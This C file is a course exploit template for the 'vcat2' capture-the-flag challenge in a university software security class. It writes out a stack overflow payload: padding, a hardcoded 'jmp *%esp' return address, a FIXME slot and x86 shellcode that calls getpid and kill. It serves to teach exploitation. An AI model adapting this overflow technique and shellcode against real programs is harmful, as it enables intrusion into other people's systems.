/*
 * CTF-2 `vcat2' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	"\x1d\x90\x04\x08" /* &'jmp *%esp'	*/
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\xb8\x14\x00\x00\x00"      /*mov    $0x14,%eax */
    "\xcd\x80"               	/*int    $0x80 */
    "\x89\xc3"               	/*mov    %eax,%ebx */
    "\xb9\x0a\x00\x00\x00"      /*mov    $0xa,%ecx */
    "\xb8\x25\x00\x00\x00"      /*mov    $0x25,%eax */
    "\xcd\x80";                	/*int    $0x80 */
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
